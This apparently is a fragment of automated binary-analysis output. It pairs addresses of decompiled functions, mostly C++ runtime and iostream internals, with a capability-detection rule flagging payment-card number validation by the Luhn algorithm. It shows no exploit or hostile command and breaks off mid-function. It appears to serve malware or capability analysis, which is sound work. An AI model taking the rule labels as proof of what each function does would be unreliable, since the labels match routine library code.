        "decompiled_code": "\nvoid __thiscall fcn.00498d70(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50a5a4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "00498e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00498e40(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x68);\n        puVar4[1] = 0;\n        *puVar4 = 0x50adf0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        *(puVar4 + 9) = 0;\n        *(puVar4 + 0x19) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    puVar4[2] = 0x502090;\n    iVar3 = *0x4f6d64;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x10) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x2e;\n    *(*(param_1 + 8) + 0x25) = 0x2c;\n    iVar2 = 0;\n    do {\n        *(*(param_1 + 8) + 0x26 + iVar2) = *(iVar3 + iVar2);\n        iVar1 = *0x4f6d60;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x4a + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x1a);\n    *(*(param_1 + 8) + 0x14) = 0x502091;\n    *(*(param_1 + 8) + 0x18) = 4;\n    *(*(param_1 + 8) + 0x1c) = 0x502096;\n    *(*(param_1 + 8) + 0x20) = 5;\n    return;\n}\n",
        "token_count": 571
    },
    "00499190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00499190(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar2 = *(param_1 + 8);\n    if (puVar2 == NULL) {\n        puVar2 = fcn.004a3500(0xa8);\n        puVar2[1] = 0;\n        *puVar2 = 0x50ae00;\n        puVar2[2] = 0;\n        puVar2[3] = 0;\n        *(puVar2 + 4) = 0;\n        puVar2[5] = 0;\n        puVar2[6] = 0;\n        puVar2[7] = 0;\n        puVar2[8] = 0;\n        puVar2[9] = 0;\n        *(puVar2 + 0x29) = 0;\n        *(param_1 + 8) = puVar2;\n    }\n    puVar2[2] = 0x502090;\n    iVar4 = *0x4f6d64;\n    iVar3 = 0;\n    puVar2[3] = 0;\n    *(puVar2 + 4) = 0;\n    puVar2[9] = 0x2c002e;\n    do {\n        *(puVar2 + iVar3 * 2 + 0x28) = *(iVar4 + iVar3);\n        iVar1 = *0x4f6d60;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x24);\n    iVar4 = 0;\n    do {\n        *(puVar2 + iVar4 * 2 + 0x70) = *(iVar1 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0x1a);\n    puVar2[5] = 0x50209c;\n    puVar2[6] = 4;\n    puVar2[7] = 0x5020a6;\n    puVar2[8] = 5;\n    return;\n}\n",
        "token_count": 484
    },
    "00499850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00499850(code **param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    \n    *param_1 = vtable.:F.1.0;\n    param_1[1] = param_2 != 0;\n    pcVar1 = fcn.0048f260();\n    param_1[2] = pcVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "00499930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00499930(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b344;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "0049a2e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049a2e0(int32_t param_1, uint param_2)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = *(param_1 + 0x18); puVar1 != NULL; puVar1 = *puVar1) {\n        (*puVar1[1])(param_2, param_1, puVar1[2]);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0049ac60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049ac60(int32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t **ppiVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    \n    iVar8 = param_1 + 0x24;\n    *(param_1 + 4) = *(param_2 + 4);\n    *(param_1 + 8) = *(param_2 + 8);\n    *(param_1 + 0xc) = *(param_2 + 0xc);\n    *(param_1 + 0x10) = *(param_2 + 0x10);\n    *(param_1 + 0x14) = *(param_2 + 0x14);\n    uVar3 = *(param_2 + 0x18);\n    *(param_2 + 0x18) = 0;\n    *(param_1 + 0x18) = uVar3;\n    iVar6 = *(param_1 + 0x68);\n    if ((iVar6 != 0) && (iVar6 != iVar8)) {\n        fcn.004a34b0(iVar6);\n    }\n    iVar6 = *(param_2 + 0x68);\n    if (iVar6 == param_2 + 0x24) {\n        *(param_1 + 0x68) = iVar8;\n        iVar6 = 0;\n        *(param_1 + 100) = 8;\n        while( true ) {\n            puVar1 = iVar8 + iVar6;\n            puVar5 = *(param_2 + 0x68) + iVar6;\n            iVar6 = iVar6 + 8;\n            uVar3 = *puVar5;\n            uVar4 = puVar5[1];\n            *puVar5 = 0;\n            puVar5[1] = 0;\n            *puVar1 = uVar3;\n            puVar1[1] = uVar4;\n            if (iVar6 == 0x40) break;\n            iVar8 = *(param_1 + 0x68);\n        }\n    }\n    else {\n        *(param_2 + 0x68) = param_2 + 0x24;\n        *(param_1 + 0x68) = iVar6;\n        uVar3 = *(param_2 + 100);\n        *(param_2 + 100) = 8;\n        *(param_1 + 100) = uVar3;\n    }\n    ppiVar7 = param_2 + 0x6c;\n    ppiVar9 = param_1 + 0x6c;\n    piVar2 = *ppiVar7;\n    if (*0x4f59f4 == 0) {\n        *piVar2 = *piVar2 + 1;\n        piVar2 = *ppiVar9;\n    }\n    else {\n        LOCK();\n        *piVar2 = *piVar2 + 1;\n        piVar2 = *ppiVar9;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar8 = *piVar2;\n        *piVar2 = iVar8 + -1;\n    }\n    else {\n        LOCK();\n        iVar8 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar8 == 1) {\n        fcn.0048f130();\n        fcn.004a34c0(piVar2);\n        *ppiVar9 = *ppiVar7;\n        return;\n    }\n    *ppiVar9 = *ppiVar7;\n    return;\n}\n",
        "token_count": 834
    },
    "0049b670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049b670(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t **ppiVar6;\n    int32_t unaff_EBP;\n    ulong uVar7;\n    int32_t **ppiVar8;\n    \n    *param_1 = 0x50b494;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    puVar3 = param_1 + 9;\n    do {\n        *puVar3 = 0;\n        puVar5 = puVar3 + 2;\n        puVar3[1] = 0;\n        puVar3 = puVar5;\n    } while (param_1 + 0x19 != puVar5);\n    param_1[0x19] = 8;\n    ppiVar6 = param_1 + 0x1b;\n    param_1[0x1a] = param_1 + 9;\n    *ppiVar6 = NULL;\n    fcn.0048cc10();\n    piVar4 = *0x4f6ee4;\n    *ppiVar6 = *0x4f6ee4;\n    if (piVar4 == *0x4f6ec8) {\n        if (*0x4f59f4 == 0) {\n            *piVar4 = *piVar4 + 1;\n            return;\n        }\n        goto code_r0x0048f600;\n    }\n    uVar1 = fcn.00428bc0();\n    if (*0x4f59f4 == 0) {\ncode_r0x0048f567:\n        piVar4 = *0x4f6ee4;\n        **0x4f6ee4 = **0x4f6ee4 + 1;\n        *ppiVar6 = piVar4;\n    }\n    else {\n        iVar2 = fcn.00418d60(uVar1);\n        if (iVar2 != 0) {\n            uVar7 = fcn.0042a720();\n            if (uVar7 >> 0x20 == -1) {\n                uVar7 = fcn.004a37a0(uVar7);\n                if (uVar7 >> 0x20 != -1) goto code_r0x004a53af;\n                fcn.004a37a0(uVar7);\n            }\n            fcn.0041b360();\ncode_r0x004a53af:\n            fcn.0041b360();\n            fcn.00429000();\n            ppiVar8 = ppiVar6;\n            do {\n                uVar7 = fcn.0041b360(ppiVar8);\n                ppiVar8 = uVar7;\n            } while (uVar7 >> 0x20 != -1);\n            fcn.004a37a0();\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.004a34c0();\n            fcn.0041b360(ppiVar6);\n            fcn.0046bf80(unaff_EBP + -0x19);\n            fcn.0041b360(uVar1);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0041b360(ppiVar6);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0041b360(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(ppiVar6);\n            fcn.0046bf80(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(ppiVar6);\n            }\n            fcn.0041b360(uVar1);\n            fcn.004640c0(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))();\n            }\n            fcn.0041b360(ppiVar6);\n            fcn.0048f380();\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.004a34c0(ppiVar6);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            do {\n                fcn.004a34c0(ppiVar6);\n                fcn.0041b360(uVar1);\n                fcn.004a34c0(ppiVar6);\n                fcn.0041b360(uVar1);\n                fcn.00433e60();\n                fcn.0046e880();\n            } while( true );\n        }\n        if (*0x4f59f4 == 0) goto code_r0x0048f567;\n        LOCK();\n        **0x4f6ee4 = **0x4f6ee4 + 1;\n        *ppiVar6 = *0x4f6ee4;\n    }\n    if ((*0x4f59f4 == 0) || (iVar2 = fcn.00418dc0(uVar1),  iVar2 == 0)) {\n        return;\n    }\n    puVar3 = fcn.004a3610(4);\n    *puVar3 = 0x509ddc;\n    piVar4 = fcn.004a3bc0(puVar3, 0x506a54, 0x42a520);\ncode_r0x0048f600:\n    LOCK();\n    *piVar4 = *piVar4 + 1;\n    return;\n}\n",
        "token_count": 2473
    },
    "0049b760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049b760(uint *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b4a4;\n    param_1[1] = param_4 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 102
    },
    "0049b7a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049b7a0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b4a4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 94
    },
    "0049b820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049b820(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b4a4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "0049b8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049b8f0(uint *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b4c0;\n    param_1[1] = param_4 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 104
    },
    "0049b930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049b930(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b4c0;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "0049b9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049b9b0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b4c0;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 94
    },
    "0049ba80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049ba80(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x68);\n        puVar4[1] = 0;\n        *puVar4 = 0x50adf0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        *(puVar4 + 9) = 0;\n        *(puVar4 + 0x19) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    puVar4[2] = 0x5020b4;\n    iVar3 = *0x4f6d64;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x10) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x2e;\n    *(*(param_1 + 8) + 0x25) = 0x2c;\n    iVar2 = 0;\n    do {\n        *(*(param_1 + 8) + 0x26 + iVar2) = *(iVar3 + iVar2);\n        iVar1 = *0x4f6d60;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x4a + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x1a);\n    *(*(param_1 + 8) + 0x14) = 0x5020b5;\n    *(*(param_1 + 8) + 0x18) = 4;\n    *(*(param_1 + 8) + 0x1c) = 0x5020ba;\n    *(*(param_1 + 8) + 0x20) = 5;\n    return;\n}\n",
        "token_count": 576
    },
    "0049bdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049bdd0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar2 = *(param_1 + 8);\n    if (puVar2 == NULL) {\n        puVar2 = fcn.004a3500(0xa8);\n        puVar2[1] = 0;\n        *puVar2 = 0x50ae00;\n        puVar2[2] = 0;\n        puVar2[3] = 0;\n        *(puVar2 + 4) = 0;\n        puVar2[5] = 0;\n        puVar2[6] = 0;\n        puVar2[7] = 0;\n        puVar2[8] = 0;\n        puVar2[9] = 0;\n        *(puVar2 + 0x29) = 0;\n        *(param_1 + 8) = puVar2;\n    }\n    puVar2[2] = 0x5020b4;\n    iVar4 = *0x4f6d64;\n    iVar3 = 0;\n    puVar2[3] = 0;\n    *(puVar2 + 4) = 0;\n    puVar2[9] = 0x2c002e;\n    do {\n        *(puVar2 + iVar3 * 2 + 0x28) = *(iVar4 + iVar3);\n        iVar1 = *0x4f6d60;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x24);\n    iVar4 = 0;\n    do {\n        *(puVar2 + iVar4 * 2 + 0x70) = *(iVar1 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0x1a);\n    puVar2[5] = 0x5020c0;\n    puVar2[6] = 4;\n    puVar2[7] = 0x5020ca;\n    puVar2[8] = 5;\n    return;\n}\n",
        "token_count": 487
    },
    "0049c380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049c380(int32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.0049fb50(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x7c) = 0;\n    }\n    else {\n        uVar2 = fcn.004a0a80(param_2);\n        *(param_1 + 0x7c) = uVar2;\n    }\n    cVar1 = fcn.0049fdd0(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x80) = 0;\n    }\n    else {\n        uVar2 = fcn.004a0d80(param_2);\n        *(param_1 + 0x80) = uVar2;\n    }\n    cVar1 = fcn.0049fd30(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x84) = 0;\n    }\n    else {\n        uVar2 = fcn.004a0cc0(param_2);\n        *(param_1 + 0x84) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "0049c6f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0049c6f0(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uchar uVar6;\n    uint *puVar7;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t iVar8;\n    int32_t extraout_ECX_01;\n    int32_t iVar9;\n    int32_t iStack132;\n    uint uStack128;\n    uint32_t in_stack_ffffff98;\n    int32_t iStack80;\n    uchar auStack64 [20];\n    uint32_t uStack24;\n    \n    uVar2 = *(param_1 + 0x78);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x14) = param_2 == 0;\n    if ((*(param_1 + 0x10) & param_2 == 0) == 0) {\n        return uVar2;\n    }\n    fcn.0049e910(\"basic_ios::clear\");\n    if (extraout_ECX_00 == uStack24) {\n        return extraout_ECX_00;\n    }\n    iVar8 = *(uStack24 + 100);\n    if (8 < iVar8) {\n        if (0xfffffff < iVar8) goto code_r0x0049c600;\n        puVar7 = fcn.004a34e0(iVar8 << 3);\n        iVar8 = *(uStack24 + 100) + -1;\n        if (-1 < iVar8) {\n            do {\n                iVar8 = iVar8 + -1;\n                *puVar7 = 0;\n                puVar7[1] = 0;\n                puVar7 = puVar7 + 2;\n            } while (iVar8 != -1);\n        }\n    }\n    iVar8 = *(uStack24 + 0x18);\n    if (iVar8 != 0) {\n        if (*0x4f59f4 == 0) {\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n    }\n    in_stack_ffffff98 = 0;\n    fcn.0049a2e0();\n    iVar3 = *(extraout_ECX_00 + 0x68);\n    if (iVar3 != extraout_ECX_00 + 0x24) {\n        if (iVar3 != 0) {\n            fcn.004a34b0(iVar3);\n        }\n        *(extraout_ECX_00 + 0x68) = 0;\n    }\n    fcn.0049a360();\n    iVar3 = *(uStack24 + 100);\n    *(extraout_ECX_00 + 0x18) = iVar8;\n    if (0 < iVar3) {\n        iVar8 = *(uStack24 + 0x68);\n        iVar9 = 0;\n        do {\n            uVar4 = *(iVar8 + 4 + iVar9);\n            *(iStack80 + iVar9) = *(iVar8 + iVar9);\n            *(iStack80 + 4 + iVar9) = uVar4;\n            iVar9 = iVar9 + 8;\n        } while (iVar9 != iVar3 * 8);\n    }\n    *(extraout_ECX_00 + 0x68) = iStack80;\n    uVar4 = *(uStack24 + 0xc);\n    *(extraout_ECX_00 + 100) = iVar3;\n    cVar1 = *(uStack24 + 0x75);\n    *(extraout_ECX_00 + 0xc) = uVar4;\n    *(extraout_ECX_00 + 8) = *(uStack24 + 8);\n    *(extraout_ECX_00 + 4) = *(uStack24 + 4);\n    *(extraout_ECX_00 + 0x70) = *(uStack24 + 0x70);\n    if (cVar1 == '\\0') {\n        piVar5 = *(uStack24 + 0x7c);\n        if (piVar5 != NULL) {\n            if (*(piVar5 + 7) == '\\0') {\n                fcn.00431cc0();\n                uVar6 = 0x20;\n                if (*(*piVar5 + 0x18) != 0x431f70) {\n                    uVar6 = (**(*piVar5 + 0x18))(0x20);\n                }\n            }\n            else {\n                uVar6 = *(piVar5 + 0x3d);\n            }\n            *(uStack24 + 0x74) = uVar6;\n            *(uStack24 + 0x75) = 1;\n            cVar1 = *(extraout_ECX_00 + 0x75);\n            goto joined_r0x0049c8f0;\n        }\n    }\n    else {\n        cVar1 = *(extraout_ECX_00 + 0x75);\n        uVar6 = *(uStack24 + 0x74);\njoined_r0x0049c8f0:\n        if (cVar1 != '\\0') {\ncode_r0x0049c816:\n            *(extraout_ECX_00 + 0x74) = uVar6;\n            fcn.0048f500(uStack24 + 0x6c);\n            fcn.0048f670(auStack64);\n            fcn.0048f620();\n            fcn.0049c380(extraout_ECX_00 + 0x6c);\n            fcn.0049a2e0(2);\n            *(extraout_ECX_00 + 0x10) = *(uStack24 + 0x10);\n            fcn.0049c600(*(extraout_ECX_00 + 0x14));\n            return extraout_ECX_00;\n        }\n        piVar5 = *(extraout_ECX_00 + 0x7c);\n        if (piVar5 != NULL) {\n            if (*(piVar5 + 7) == '\\0') {\n                fcn.00431cc0();\n                if (*(*piVar5 + 0x18) != 0x431f70) {\n                    (**(*piVar5 + 0x18))(0x20);\n                }\n            }\n            *(extraout_ECX_00 + 0x75) = 1;\n            goto code_r0x0049c816;\n        }\n    }\n    fcn.0049e780();\ncode_r0x0049c600:\n    fcn.004a3c30();\n    in_stack_ffffff98 = in_stack_ffffff98 | *(extraout_ECX_01 + 0x14);\n    if (*(extraout_ECX_01 + 0x78) == 0) {\n        in_stack_ffffff98 = in_stack_ffffff98 | 1;\n    }\n    *(extraout_ECX_01 + 0x14) = in_stack_ffffff98;\n    if ((*(extraout_ECX_01 + 0x10) & in_stack_ffffff98) != 0) {\n        fcn.0049e910(\"basic_ios::clear\");\n        fcn.0048f500(iStack132 + 0x6c);\n        fcn.0049ab80(iStack132, uStack128);\n        fcn.0048f620();\n        fcn.0049c380(uStack128);\n        piVar5 = *(iStack132 + 0x78);\n        if (piVar5 != NULL) {\n            fcn.0048f500(piVar5 + 7);\n            (**(*piVar5 + 8))(uStack128);\n            fcn.0048f670(uStack128);\n            fcn.0048f620();\n        }\n        return extraout_ECX;\n    }\n    return in_stack_ffffff98;\n}\n",
        "token_count": 1789
    },
    "0049cbb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049cbb0(int32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.0049fba0(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x7c) = 0;\n    }\n    else {\n        uVar2 = fcn.004a0ae0(param_2);\n        *(param_1 + 0x7c) = uVar2;\n    }\n    cVar1 = fcn.0049fe20(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x80) = 0;\n    }\n    else {\n        uVar2 = fcn.004a0de0(param_2);\n        *(param_1 + 0x80) = uVar2;\n    }\n    cVar1 = fcn.0049fd80(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x84) = 0;\n    }\n    else {\n        uVar2 = fcn.004a0d20(param_2);\n        *(param_1 + 0x84) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "0049cf10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0049cf10(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    ushort uVar6;\n    uint *puVar7;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t iVar8;\n    int32_t extraout_ECX_01;\n    int32_t iVar9;\n    int32_t iStack132;\n    uint uStack128;\n    uint32_t in_stack_ffffff98;\n    int32_t iStack80;\n    uchar auStack64 [20];\n    uint32_t uStack24;\n    \n    uVar3 = *(param_1 + 0x78);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x14) = param_2 == 0;\n    if ((*(param_1 + 0x10) & param_2 == 0) == 0) {\n        return uVar3;\n    }\n    fcn.0049e910(\"basic_ios::clear\");\n    if (extraout_ECX_00 == uStack24) {\n        return extraout_ECX_00;\n    }\n    iVar8 = *(uStack24 + 100);\n    if (8 < iVar8) {\n        if (0xfffffff < iVar8) goto code_r0x0049ce20;\n        puVar7 = fcn.004a34e0(iVar8 << 3);\n        iVar8 = *(uStack24 + 100) + 